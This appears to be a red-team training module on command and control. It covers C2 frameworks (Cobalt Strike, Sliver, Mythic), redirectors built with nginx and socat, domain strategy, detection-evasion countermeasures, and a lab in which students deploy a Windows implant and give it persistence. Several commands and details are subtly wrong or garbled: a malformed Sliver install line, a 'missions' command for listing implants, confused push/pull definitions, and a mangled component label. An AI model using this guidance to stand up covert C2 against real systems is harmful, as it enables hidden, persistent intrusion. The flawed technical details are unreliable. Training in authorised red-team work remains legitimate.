# Module 13: Command & Control

## Objectives
- Understand C2 architecture, components, and communication patterns
- Configure and operate Cobalt Strike, Sliver, and Mythic C2 frameworks
- Design C2 channels that blend with normal traffic
- Implement redirectors and domain infrastructure for resilient C2
- Understand C2 detection and network monitoring

---

## 13.1 C2 Fundamentals

Command and Control (C2) is the infrastructure and software that allows an attacker to communicate with and control compromised systems after initial access. It's the bridge between exploitation and objectives.

### C2 Architecture

```
[Attacker] ←→ [C2 Server] ←→ [Redirector(s)] ←→ [Implant on Target]
     │              │                │                  │
     │              │                │                  │
     └── C2 Client ─┘                │                  │
                                      │                  │
                              [Internet/DNS]      [Victim Network]
```

| Component | Purpose |
|-----------|---------|
| **C2 Server** | The central control point — sends commands, receives results |
| **C2 Client** | The attacker's interface to the C2 server (web UI, CLI, GUI) |
| **Implant/Bean/AC and Agent** | Code running on the compromised system that communicates with C2 |
| **Redirector** | Middleman that forwards C2 traffic, hiding the real C2 server IP |
| **Domain/Infrastructure** | The DNS and hosting that makes C2 reachable |

### C2 Communication Patterns

| Pattern | Description | Pros | Cons |
|---------|-------------|------|------|
| **Beacon (check-in)** | Implant periodically contacts C2 to ask for tasks | Simple, hard to lose connection | Detectable periodic pattern (mitigate with jitter) |
| **Push (reverse)** | Implant initiates connection to C2 | Works behind NAT/firewall, no inbound needed | C2 server must be reachable from target |
| **Pull (callback)** | C2 pushes commands to implant | Lower latency for urgent tasks | Requires implant to be reachable (often not the case) |
| **Heartbeat** | Regular "I'm alive" signal | Shows implant is active | Adds traffic, detectable pattern |
| **Task-driven** | C2 sends tasks, implant executes and returns results | Structured, efficient | Requires reliable communication |
| **Sleep + jitter** | Implant sleeps between check-ins with random variation | Avoids regular beacon pattern detection | Adds latency to command execution |
| **Encryption** | All C2 traffic encrypted | Prevents content inspection | Doesn't hide timing or volume patterns |

---

## 13.2 C2 Frameworks

### Cobalt Strike

Cobalt Strike is the most widely known commercial C2 framework. It's extensively used by red teams and is also sold on the black market (as "Cobalt Strike stolen builds").

```bash
# Start Cobalt Strike (if licensed)
# Java-based, starts with:
./teamserver <IP> <password>
# Then connect from the Cobalt Strike client (aggressor script GUI)

# In the CS client:
# 1. Create a team (connection to teamserver)
# 2. Set up a listener (HTTP, HTTPS, DNS, TCP, etc.)
# 3. Generate an implant (payload/stager)
# 4. Deploy the implant to a target
# 5. Interact with the implant via the UI or commands
```

**Cobalt Strike Listener Types:**
| Listener | Protocol | Use Case |
|----------|----------|----------|
| **HTTP** | HTTP/HTTPS | Most common, blends with web traffic |
| **HTTPS** | HTTPS with cert | More blending — looks like normal HTTPS |
| **DNS** | DNS queries/responses | Very stealthy, but slow and complex |
| **TCP** | Raw TCP | Simple, but easily detected as non-standard |
| **Named Pipe** | Windows IPC | Local lateral movement, often Cobalt Strike default for internal |
| **SMB** | SMB | Lateral movement via SMB named pipes |

**Cobalt Strike Malleable C2 Profiles:**
Malleable C2 allows you to customize how the implant communicates — the HTTP headers, URI patterns, response sizes, sleep behavior, etc. This is critical for blending in.

```
# Example malleable profile snippet
http-get {
    uri {
        client {
            uri "|/api/v1/data|"
        }
        server {
            uri "|/services/ping|"
        }
    }
    client {
        header "User-Agent" "Mozilla/5.0 ..."
        header "Host" "cdn.example.com"
    }
}
```

**Key point:** A well-configured malleable profile makes C2 traffic look like normal web traffic to a specific legitimate service. Poor profiles make C2 trivially detectable.

### Sliver

Sliver is an open-source C2 framework that has gained popularity as a Cobalt Strike alternative. It supports multiple platforms, implant protocols, and is actively developed.

```bash
# Install Sliver (Go-based)
go install github.com/BishopFox/sliver.git@latest

# Or use the binary release
wget https://github.com/BishopFox/sliver/releases/download/v1.5.40/sliver_linux_amd64.tar.gz
tar xzf sliver_linux_amd64.tar.gz
./sliver

# In Sliver CLI:
sliver > configure domain <your-c2-domain>
sliver > configure port 443
sliver > generate --format exe --listener https --outfile implant.exe
sliver > missions  # List active implants
sliver > interact <implant-id>
sliver > shell whoami   # Run command on implant
sliver > exit
```

**Sliver Features:**
- Multiple implant protocols (mutual TLS, HTTP(S), DNS, TCP)
- Cross-platform (Windows, Linux, macOS, Android)
- WireGuard VPN integration
- OpSec-focused design (less hardcoded indicators)

### Mythic

Mythic is a modular, agent-agnostic C2 framework. It supports multiple C2 agents (called "mythic agents") through a plugin architecture.

```bash
# Mythic setup is more involved — Docker-based
# See: https://github.com/its-a-feature/Mythic

# In Mythic:
# 1. Create an agent (choose from supported agents)
# 2. Configure C2 profile (HTTP, DNS, etc.)
# 3. Generate payload
# 4. Deploy and interact
```

---

## 13.3 C2 Infrastructure

### Redirectors

A redirector is a server that sits between the implant and the C2 server, forwarding traffic. If the redirector is discovered, the real C2 server remains hidden.

**Setup options:**
- **Dedicated VPS:** A cheap cloud VPS that runs nginx/haproxy to forward traffic
- **Compromised server:** Using a legitimate (compromised) server as a redirector
- **Cloud services:** Using Cloudflare or similar as a front-end (though this has its own indicators)

**Nginx redirector example:**
```nginx
# /etc/nginx/sites-available/c2-redirector
server {
    listen 80;
    server_name c2-domain.com;

    location / {
        proxy_pass http://REAL_C2_SERVER_IP:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

**Benefits of redirectors:**
- C2 server IP stays hidden
- Can swap redirectors without changing implant config
- Can take down a redirector if compromised without losing C2
- Can use multiple redirectors for redundancy and geographic diversity

### Domain Strategy

| Aspect | Good Practice | Bad Practice |
|--------|---------------|--------------|
| **Domain age** | Older, established-looking domains | Brand new domains (immediate suspicion) |
| **Domain name** | Looks like legitimate service, CDN, or cloud | Random strings, obvious malicious names |
| **WHOIS privacy** | Enabled (normal for legitimate domains) | No privacy, personal info visible |
| **DNS setup** | Uses legitimate CDN or hosting DNS | Fast-flux DNS, suspicious NS records |
| **SSL certificate** | Valid, from reputable CA, looks legitimate | Self-signed, expired, mismatched domain |
| **Infrastructure diversity** | Multiple domains, providers, locations | Single domain, single provider, single IP |

### Infrastructure Lifecycle

1. **Preparation (before engagement):** Set up domains, redirectors, C2 server — all before the engagement starts
2. **Operational phase:** Use infrastructure for C2 during the engagement
3. **Burn when necessary:** If a redirector or domain is discovered, replace it. If C2 server is discovered, you've likely lost the engagement.
4. **Retirement:** After engagement, take down or repurpose infrastructure. Don't leave C2 running.

---

## 13.4 Implant Development Concepts

Understanding how implants work helps you use C2 frameworks more effectively and troubleshoot issues.

### Implant Lifecycle

1. **Stager:** Small initial payload that downloads and executes the full implant. Often used to evade size limits or detection. The stager connects to C2, downloads the full implant, and executes it.
2. **Full implant:** The complete agent that communicates with C2, executes commands, and exfiltrates data.
3. **Sleep:** Implant goes dormant between check-ins to reduce traffic and detection.
4. **Task processing:** When implant checks in, C2 sends tasks. Implant executes tasks and returns results.
5. **Upgrade:** Implant can download a newer version of itself (useful for upgrading from stager to full implant, or for patching).

### Stager vs. Stageless
- **Staged:** Stager downloads implant from C2. Smaller initial payload, but requires network access to C2 at time of exploitation. The stager itself may be detected.
- **Stageless:** Full implant embedded in the initial payload. Larger initial payload, but no second download. More self-contained.

**Trade-off:** Staged is smaller and more flexible. Stageless is more reliable if the C2 channel might be blocked after initial execution.

### Cross-Platform Considerations
- **Windows:** Most common target. .exe, DLL, PowerShell, VBScript, HTA implants.
- **Linux:** .elf, Python, shell scripts, shared libraries.
- **macOS:** Mach-O executables, AppleScript, launchd persistence.
- **Mobile:** APK for Android, various for iOS (more restricted).

---

## 13.5 C2 Detection

Understanding how C2 is detected helps you design better infrastructure and choose appropriate techniques.

### Network Detection of C2

| Detection Method | What It Catches | Countermeasures |
|-----------------|-----------------|-----------------|
| **Beacon detection** | Regular intervals of HTTP/DNS traffic to same destination | Jitter, irregular intervals, blend with legitimate traffic patterns |
| **Traffic analysis** | Unusual volume, Packet sizes, protocol anomalies | Shape traffic to match legitimate patterns, use encryption |
| **Domain reputation** | Known malicious domains, newly registered domains | Use aged domains, legitimate-looking names |
| **SSL/TLS inspection** | Unusual certificates, JA3 fingerprints | Use legitimate certificates, mimic common client SSL fingerprints |
| **DNS monitoring** | DNS queries to suspicious domains, high DNS volume, DNS tunneling | Use legitimate DNS patterns, minimize DNS-based C2 |
| **Threat intelligence** | C2 IPs/domains on threat feeds | Use fresh infrastructure, rotate redirectors |
| **JA3/JA4 fingerprinting** | SSL/TLS client fingerprints | Mimic common browser fingerprints |
| **HTTP header analysis** | Unusual User-Agent, missing common headers, weird URI patterns | Use realistic headers, legitimate-looking URIs, malleable C2 |

### Host Detection of Implants
- **Process monitoring:** Unknown processes, processes with suspicious names or paths
- **Network connection monitoring:** Processes making unexpected network connections
- **File system monitoring:** New files in unusual locations, files with suspicious content
- **Memory scanning:** Implants running in memory (fileless) can be detected by memory analysis
- **Behavioral detection:** Process behavior that doesn't match its name or reputation

### Cobalt Strike-Specific Detection
Cobalt Strike has many well-known indicators:
- Default HTTP URIs and headers (before malleable profile customization)
- Default SSL certificates (self-signed, specific patterns)
- Default implant names and behaviors
- Known malleable profile patterns (community share "detections" of common profiles)
- Default ports and configuration patterns

Using default Cobalt Strike settings in a real engagement is amateurish. Customize everything.

---

## 13.6 C2 Best Practices

### Operational Security (OPSEC)
1. **Never use default configurations** — customize everything
2. **Use redirectors** — never expose C2 server IP directly
3. **Rotate infrastructure** — if a domain or redirector is burned, replace it
4. **Minimize traffic** — sleep longer, use jitter, only check in when needed
5. **Blend with legitimate traffic** — make C2 look like normal web traffic to a real service
6. **Use valid SSL certificates** — self-signed certs are an immediate red flag
7. **Test C2 before use** — verify it works, verify it doesn't have obvious indicators
8. **Have a backup plan** — if C2 goes down, have alternative access methods

### C2 Server Security
- The C2 server is a high-value target. If compromised, the attacker loses control and the defender gains insight into the red team's operations.
- Restrict access to the C2 server (VPN, IP allowlist, MFA)
- Monitor the C2 server itself for compromise indicators
- Log C2 server activity carefully (but be aware these logs are sensitive)

### Legal and Ethical Considerations
- C2 infrastructure in a real engagement must be disclosed in the Rules of Engagement
- C2 domains must be documented so defenders can investigate without being confused about whether they're real attacks
- After the engagement, C2 infrastructure must be taken down
- Never leave C2 running "just in case" — always have a controlled shutdown

---

## 13.7 Lab: Command & Control

### Setup
- Kali Linux (10.10.1.10) — C2 server
- A cloud VPS or second VM — redirector (optional, can simulate with local setup)
- Windows 10 Client (10.10.1.101) — target for implant
- Sliver or Mythic installed (open source alternatives since Cobalt Strike requires a license)

### Tasks

**Task 1: C2 Architecture Understanding**
1. Draw or describe the C2 architecture you would use for a real engagement:
   - How many redirectors?
   - What domain strategy?
   - What listener protocol?
   - How does the implant get to the target?
   - Where does the C2 server sit?
2. Document your architecture with a diagram and justification for each choice.

**Task 2: Sliver C2 Setup**
1. Install and configure Sliver on Kali:
   ```bash
   # Follow Sliver installation docs
   # Start Sliver server
   ./sliver-server
   ```
2. Configure a listener:
   - Create an HTTPS listener on port 443
   - Configure the domain
   - Generate a self-signed or test certificate (in real engagement, use a real cert)
3. Generate an implant:
   - Windows .exe format
   - For the HTTPS listener
   - Output to a file
4. Document the setup process and configuration choices

**Task 3: Implant Deployment and Interaction**
1. Transfer the implant to the Windows 10 client (via any method — web upload, SMB, etc.)
2. Execute the implant on the Windows target
3. On the C2 server (Kali), observe the implant check in:
   - Sliver CLI: `missions` to see active implants
4. Interact with the implant:
   - Run `whoami`, `hostname`, `ipconfig`, `getuid` equivalent commands
   - Run a shell command: `shell dir C:\`
   - Take a screenshot if the implant supports it
   - Enumerate processes, services, or network connections
5. Document each interaction and the results

**Task 4: C2 Traffic Analysis**
1. On the Kali C2 server, capture traffic:
   ```bash
   tcpdump -i any -w c2_capture.pcap port 443
   ```
2. Have the implant on Windows perform several tasks (run commands, take screenshot, etc.)
3. Stop the capture and analyze the PCAP:
   - How much traffic was generated?
   - What does the beacon pattern look like?
   - Can you identify the implant check-ins in the traffic?
   - What encryption is used on the traffic?
4. Document the traffic analysis findings

**Task 5: Malleable C2 / Profile Customization**
1. Create a custom C2 profile (Sliver or whichever framework supports profile customization):
   - Customize the HTTP headers (User-Agent, Host, referer, etc.)
   - Customize the URI path (looks like a real API endpoint)
   - Configure jitter (random delay on beacons)
   - Configure sleep interval
2. Generate a new implant with the custom profile
3. Deploy and observe:
   - Does the traffic look different with the custom profile?
   - How does jitter affect the beacon pattern?
4. Document the profile configuration and traffic differences

**Task 6: Redirector Setup (Simulated)**
1. If you have a second machine or VPS, set up a simple redirector (nginx or socat):
   ```bash
   # Using socat as a simple TCP redirector
   socat TCP-LISTEN:80,fork,reuseaddr TCP:<C2_SERVER_IP>:8080
   ```
2. Configure the implant to connect to the redirector instead of the C2 server directly
3. Verify the implant still works through the redirector
4. Document the redirector setup and test results
5. If a second machine isn't available, simulate this conceptually and document what you would do

**Task 7: Implant Persistence**
1. On the Windows target, establish persistence for the implant:
   - Scheduled task that runs the implant at logon
   - Registry run key
   - Service creation
2. Reboot the Windows VM (if allowed) or log off/on
3. Verify the implant reconnects to C2 after reboot/logon
4. Document the persistence method and verification

**Task 8: C2 Detection Analysis and Countermeasures**
1. Review the traffic and behavior of your C2 from a defender's perspective:
   - What indicators would a network monitor see?
   - What would a host-based monitor see?
   - What would be the easiest way to detect this C2?
2. Research and document:
   - How would you improve the C2's stealth?
   - What infrastructure changes would help?
   - What operational practices would reduce detection risk?
3. Write a brief C2 OPSEC plan for a hypothetical engagement

---

## 13.8 Expected Outcomes

By the end of this module, you should be able to:
- Explain C2 architecture and the role of each component
- Set up and configure a C2 framework (Sliver or equivalent)
- Generate, deploy, and interact with implants
- Analyze C2 traffic and understand detection characteristics
- Implement redirectors and customize C2 profiles for blending
- Establish implant persistence
- Apply OPSEC principles to C2 operations

---

## 13.9 Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| C2 architecture design | 5 | Documents C2 architecture with justification |
| C2 framework setup | 10 | Successfully configures and starts C2 server and listener |
| Implant deployment and interaction | 10 | Deploys implant, runs commands, demonstrates control |
| Traffic analysis | 10 | Analyzes PCAP, identifies beacon patterns and characteristics |
| Profile customization | 10 | Customizes C2 profile, demonstrates impact on traffic |
| Redirector setup | 5 | Sets up redirector (or documents conceptual approach) |
| Persistence | 5 | Establishes and verifies implant persistence |
| OPSEC analysis | 5 | Analyzes detection risk and proposes improvements |
| Report quality | 10 | Professional documentation of all activities |
| **Total** | **70** | |

**Pass threshold:** 49/70 (70%)

### Report Requirements (4–5 pages)
1. C2 architecture — diagram and description of planned infrastructure
2. C2 framework setup — installation, configuration, listener setup
3. Implant operations — deployment, commands run, results obtained
4. Traffic analysis — PCAP analysis, beacon pattern, visibility
5. Custom profile — what was customized, traffic differences before/after
6. Redirector setup — configuration, testing, operational benefits
7. OPSEC assessment — detection risk analysis, recommended improvements
